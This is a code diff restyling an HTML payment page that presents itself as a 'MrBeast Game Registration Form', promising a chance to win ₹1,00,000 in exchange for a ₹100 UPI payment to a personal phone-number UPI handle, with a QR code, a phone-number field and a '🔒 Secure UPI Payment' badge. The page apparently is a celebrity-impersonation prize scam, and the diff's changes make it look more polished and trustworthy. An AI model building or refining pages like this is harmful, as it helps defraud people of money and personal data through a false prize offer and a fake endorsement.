@@ -16,14 +16,15 @@
     }
 
     .container {
-      background: rgba(0, 0, 0, 0.5);
+      background: rgba(0, 0, 0, 0.55);
       padding: 35px;
       border-radius: 20px;
-      box-shadow: 0 6px 30px rgba(0,0,0,0.4);
+      box-shadow: 0 6px 35px rgba(0,0,0,0.6);
       max-width: 450px;
       width: 100%;
       text-align: center;
-      border: 1px solid rgba(255,255,255,0.2);
+      border: 1px solid rgba(255,255,255,0.15);
+      backdrop-filter: blur(6px);
     }
 
     .logo {
@@ -39,15 +40,15 @@
       -webkit-text-fill-color: transparent;
       text-transform: uppercase;
       margin-bottom: 8px;
-      text-shadow: 0 0 10px rgba(212,175,55,0.6);
+      text-shadow: 0 0 12px rgba(212,175,55,0.7);
     }
 
     .sub {
       font-size: 15px;
       font-weight: 600;
       letter-spacing: 1px;
-      color: #fff;
-      margin-bottom: 20px;
+      color: #ddd;
+      margin-bottom: 18px;
     }
 
     h2 {
@@ -60,16 +61,29 @@
       display: block;
       margin: 10px 0 5px;
       text-align: left;
-      color: #fff;
+      color: #eee;
     }
 
     input {
       width: 100%;
       padding: 12px;
-      border: 1px solid #bbb;
-      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 10px;
       margin-bottom: 15px;
       font-size: 15px;
+      background: rgba(255,255,255,0.08);
+      color: #fff;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      border-color: #f1c40f;
+      box-shadow: 0 0 8px rgba(241,196,15,0.7);
+    }
+
+    ::placeholder {
+      color: #bbb;
     }
 
     .pay-btn {
@@ -81,19 +95,20 @@
       font-size: 17px;
       font-weight: bold;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
       text-decoration: none;
       transition: 0.3s;
-      box-shadow: 0 4px 15px rgba(0,123,255,0.4);
+      box-shadow: 0 4px 15px rgba(0,123,255,0.5);
     }
 
     .pay-btn:hover {
       background: linear-gradient(135deg, #0056b3, #003f88);
+      transform: translateY(-2px);
     }
 
     .pay-btn.disabled {
-      background: #999;
+      background: #666;
       cursor: not-allowed;
       box-shadow: none;
     }
@@ -107,7 +122,7 @@
       width: 180px;
       border: 3px solid #eee;
       border-radius: 12px;
-      background: #fff;
+      background: transparent;
     }
 
     .secure {
@@ -126,15 +141,15 @@
 </head>
 <body>
   <div class="container">
-    <img src="your-logo.png" alt="Logo" class="logo">
+    <!-- Use a transparent PNG logo here -->
+    <img src="your-logo-transparent.png" alt="Logo" class="logo">
 
     <div class="headline">Get a Chance to Win ₹1,00,000!</div>
     <div class="sub">MrBeast Game Registration Form</div>
 
     <h2>Register & Pay ₹100</h2>
 
-    <!-- Instructions -->
-    <p style="color:#fff; font-size: 14px; margin-top: 0; margin-bottom: 10px;">
+    <p style="color:#ccc; font-size: 14px; margin-top: 0; margin-bottom: 10px;">
       📱 <strong>UPI payments only.</strong> Use Google Pay, PhonePe, Paytm, etc.
     </p>
 
@@ -148,12 +163,10 @@
       <label for="phone">Phone Number</label>
       <input type="tel" id="phone" placeholder="Enter your phone number" required>
 
-      <!-- UPI Link -->
       <a href="upi://pay?pa=8469626550@fam&pn=mrbeast&am=100&cu=INR" class="pay-btn" id="upiPayBtn">
         Pay ₹100 & Register
       </a>
 
-      <!-- Desktop Notice -->
       <p class="notice" id="deviceWarning" style="display: none;">
         ⚠️ UPI payments can only be done via mobile apps. Please open this page on your phone.
       </p>
@@ -161,14 +174,13 @@
 
     <div class="qr-box">
       <p>Or scan to pay:</p>
-      <img src="Screenshot_20250828_145709_Chrome~2.jpg" alt="UPI QR">
+      <img src="qr.png" alt="UPI QR">
     </div>
 
     <div class="secure">🔒 Secure UPI Payment</div>
   </div>
 
   <script>
-    // Device check for mobile
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     const upiBtn = document.getElementById('upiPayBtn');
     const warning = document.getElementById('deviceWarning');
